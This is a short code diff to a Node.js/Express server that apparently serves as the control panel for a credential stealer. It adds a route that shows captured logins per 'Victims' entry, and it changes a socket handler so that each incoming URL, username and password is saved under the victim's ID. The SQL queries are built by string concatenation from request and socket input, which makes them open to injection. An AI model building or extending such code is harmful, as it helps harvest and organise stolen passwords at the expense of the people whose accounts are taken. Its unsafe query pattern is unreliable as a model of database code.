@@ -220,6 +220,21 @@ app.get('/history',
     });
   });
 
+  app.get('/loginInfo',
+    require('connect-ensure-login').ensureLoggedIn(),
+    function(req, res) {
+      con.query("SELECT * FROM LoginInfo WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
+        if (err) throw err;
+        con.query("SELECT * FROM Victims", function(err, userResult, fields) {
+          if (err) throw err;
+          res.render('loginInfo', {
+            users: userResult,
+            rowData: history
+          });
+        });
+      });
+    });
+
 app.get('/profile',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
@@ -311,7 +326,7 @@ io.on('connection', (socket) => {
       var p1 = "'"+loginInfo2[0]+"'";
       var p2 = "'"+loginInfo3[0]+"'";
       var p3 = "'"+loginInfo3[1]+"'";
-      var sql = "INSERT INTO LoginInfo (url, username, password) VALUES ("+p1 +", "+p2 +", " + p3+")";
+      var sql = "INSERT INTO LoginInfo (url, username, password,userID) VALUES ("+p1 +", "+p2 +", " + p3+", "+userData.id+")";
       con.query(sql, function (err, result) {
         if(err) throw err;
       });
